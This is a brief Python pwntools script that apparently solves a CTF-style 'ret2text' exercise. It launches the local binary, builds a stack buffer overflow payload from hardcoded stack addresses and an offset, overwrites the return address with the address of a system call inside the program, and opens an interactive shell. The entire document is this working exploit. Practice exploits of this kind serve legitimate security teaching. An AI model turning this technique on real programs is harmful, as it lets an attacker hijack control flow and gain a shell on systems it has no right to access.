from pwn import *

sh = process('./ret2text')
ebp = 0xffffd2e8
esp = 0xffffd260
s_offset = 0x1c
system_addr = 0x804863a
sh.sendline('A' * (ebp-esp-s_offset+4) + p32(system_addr))
sh.interactive()
